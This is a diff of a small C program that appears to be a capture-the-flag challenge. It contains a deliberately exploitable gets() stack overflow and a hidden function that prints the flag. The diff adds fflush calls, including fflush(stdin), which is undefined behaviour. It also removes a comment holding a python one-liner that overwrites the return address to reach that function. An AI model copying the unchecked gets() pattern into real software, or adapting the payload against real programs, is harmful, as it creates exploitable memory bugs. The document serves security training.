@@ -3,27 +3,29 @@
 
 int flaggyyy(){
 	printf("\nAlright! Take the flag..\n");
+fflush(stdout);
+    fflush(stdin);
 	system("cat /bin/pwn3");
 	return 0;
 }
 int func(){
 	char buffer[20];
 	printf("Blow the stack!\n");
+fflush(stdout);
+    fflush(stdin);
 	gets(buffer);	
 	return 0;
 }
 
 int main(){
   printf("\nHello there\n");
+fflush(stdout);
+    fflush(stdin);
   func();
-  printf("Aah! You're a good lad.\n");	
+  printf("Aah! You're a good lad.\n");
+fflush(stdout);
+    fflush(stdin);	
   return 0;
 }
 
-/*
-abcdefghijklmn''''stuvwxyz
-exploit:
-abcdefghijklmn''''stuvwx####cdefghijklmn''''stuvwxyz
-python -c 'print "x"*24+"\x08\x04\x84\x86"[::-1]'|./pwn3
 
-*/
